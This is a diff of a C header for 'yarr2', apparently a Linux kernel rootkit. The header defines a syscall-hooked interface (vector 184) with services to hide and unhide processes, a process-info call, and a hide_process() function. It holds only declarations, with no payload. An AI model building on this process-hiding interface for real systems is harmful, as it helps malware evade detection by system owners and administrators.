@@ -1,10 +1,11 @@
 #ifndef __YARR_YARRLIB
 #define __YARR_YARRLIB
 
-/*
- * This is the header file userland programs should include in order to be able
- * to request services to yarr2.
- */
+// When including this file from a userland program we need to include
+// sys/types.h, but this header file is not present in the kernel sources.
+#ifndef __KERNEL__
+    #include <sys/types.h>
+#endif
 
 // This is the vector used for accessing yarr2 services. It correspond to the
 // tuxcall syscall. In my kernels it is not used in the 64-bit table, it is in
@@ -15,9 +16,10 @@
 #define YARR_VECTOR (184)
 
 // Here we define the different services someone can request to yarr2.
-enum YARRCALL_VECTORS {
+enum YARRCALL_SERVICE {
     HIDE_PID = 1,
-    STOP_HIDE_PID
+    UNHIDE_PID,
+    __GET_PROC_INFO
 };
 
 // TODO: I'm going to define all the argument types for services here. They
@@ -28,6 +30,11 @@ enum YARRCALL_VECTORS {
 typedef struct {
     pid_t pid;
 } HidePidArgs_t;
+
+typedef struct {
+    pid_t pid;
+    pid_t tgid;
+} __GetProcInfoArgs_t;
 
 // TODO: Example.
 //typedef struct {
@@ -40,6 +47,27 @@ typedef union {
     HidePidArgs_t hidepid_args;
     // TODO: Example.
     //HideFileArgs_t hidefile_args;
-} YarrCallArgs_t;
+    __GetProcInfoArgs_t getprocinfo_args;
+} YarrcallArgs_t;
+
+/**
+ * The userland entry point. This is the function that developers using yarr2
+ * should use in order to request services to yarr2 module (in theory already
+ * loaded into the kernel).
+ *
+ * @svc: The type of service we request. This should be one of the values of
+ * YARRCALL_SERVICES.
+ * @args: A pointer to the arguments for that specific service.
+ * @return: Zero on success, non-zero elsewhere.
+ */
+long yarrcall(int svc, YarrcallArgs_t *args);
+
+/**
+ * Asks yarr2 to hide a process in the system.
+ *
+ * @pid: The pid of the process to hide.
+ * @return: Zero on sucess, non-zero elsewhere.
+ */
+long hide_process(pid_t pid);
 
 #endif
